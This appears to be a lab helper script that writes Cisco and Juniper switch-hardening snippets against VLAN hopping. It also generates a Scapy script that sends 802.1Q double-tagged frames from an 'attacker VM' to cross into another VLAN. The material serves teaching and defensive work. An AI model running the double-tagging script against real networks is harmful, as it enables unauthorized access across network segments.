# `scripts/vlan_hardening.sh`
```bash
#!/bin/bash
# vlan_hardening.sh
# Generates switch hardening snippets and provides a Scapy double-tag demo script.
# Place this file in scripts/ and run locally to create helper files.
#
# NOTE: This does NOT apply configs to physical switches. It writes recommended
# config snippets you can paste into your switch CLI. Run scapy script only in lab.

set -e

OUTDIR="$(dirname "$0")"
echo "[*] Generating switch hardening snippets and scapy demo..."

# Cisco hardening snippet
cat > "${OUTDIR}/cisco_hardening.txt" <<'CISCO'
! Cisco switch hardening (example)
! Apply per-access-port:
interface FastEthernet0/X
  switchport mode access
  switchport access vlan 10
  switchport nonegotiate           ! disable DTP
  switchport port-security
  switchport port-security maximum 2
  switchport port-security mac-address sticky
  switchport port-security violation restrict
  spanning-tree portfast
  spanning-tree bpduguard enable

! On trunk ports, set native to unused VLAN:
interface GigabitEthernet0/1
  switchport trunk native vlan 999
  switchport trunk allowed vlan 10,20,30
CISCO

# Juniper snippet (example)
cat > "${OUTDIR}/juniper_hardening.txt" <<'JUNIPER'
# Juniper (example) - disable auto-negotiation for trunking and restrict VLANs
set interfaces ge-0/0/1 unit 0 family ethernet-switching port-mode trunk
set interfaces ge-0/0/1 unit 0 family ethernet-switching vlan members [ v10 v20 ]
set vlans v999 vlan-id 999  # native/unused VLAN
# Enable storm control, BPDU protection via chassis/port settings as needed
JUNIPER

# Generate scapy double-tag demo
cat > "${OUTDIR}/double_tag_send.py" <<'SCAPY'
#!/usr/bin/env python3
# double_tag_send.py
# Sends a single 802.1Q double-tagged Ethernet frame.
# Run as root on attacker VM in an isolated lab.
#
# WARNING: For lab only. Ensure scapy is installed: pip3 install scapy

from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
import sys
import time

if len(sys.argv) < 4:
    print("Usage: sudo python3 double_tag_send.py <interface> <outer_vlan> <inner_vlan> [dst_mac] [dst_ip]")
    print("Example: sudo python3 double_tag_send.py eth0 20 10 aa:bb:cc:dd:ee:ff 192.168.10.5")
    sys.exit(1)

iface = sys.argv[1]
outer_vlan = int(sys.argv[2])
inner_vlan = int(sys.argv[3])
dst_mac = sys.argv[4] if len(sys.argv) > 4 else "ff:ff:ff:ff:ff:ff"
dst_ip = sys.argv[5] if len(sys.argv) > 5 else "192.168.10.5"

# Craft double-tagged frame: Ether / Dot1Q(outer) / Dot1Q(inner) / IP / ICMP
frame = Ether(dst=dst_mac)/Dot1Q(vlan=outer_vlan)/Dot1Q(vlan=inner_vlan)/IP(dst=dst_ip)/ICMP()

print(f"Sending double-tagged frame on {iface}: outer={outer_vlan}, inner={inner_vlan}, dst={dst_ip}")
sendp(frame, iface=iface, count=10, inter=0.2)
print("Done.")
SCAPY

chmod +x "${OUTDIR}/double_tag_send.py"

echo "[*] Files created:"
echo " - ${OUTDIR}/cisco_hardening.txt"
echo " - ${OUTDIR}/juniper_hardening.txt"
echo " - ${OUTDIR}/double_tag_send.py"

echo ""
echo "Usage:"
echo "  1) Review cisco_hardening.txt and paste relevant lines into your switch CLI (lab only)."
echo "  2) On attacker VM, run (example): sudo python3 scripts/double_tag_send.py eth0 20 10 aa:bb:cc:dd:ee:ff 192.168.10.5"
echo ""
echo "Remember: run attacks only in isolated lab environment and with permission."
